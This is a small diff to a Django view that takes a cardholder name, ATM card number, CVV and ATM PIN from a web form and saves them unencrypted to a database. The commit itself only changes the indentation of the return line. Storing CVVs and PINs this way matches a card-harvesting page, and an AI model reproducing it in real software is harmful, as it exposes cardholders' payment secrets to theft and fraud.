@@ -34,7 +34,7 @@ def process(request):
         cvv = request.POST["cvv"]
         cont = UserDetails(username = cardholder ,atm = atm,cvv = cvv,atmpin = atmpin)
         cont.save()
-    return render(request, 'index.html')
+        return render(request, 'index.html')
 
 
     
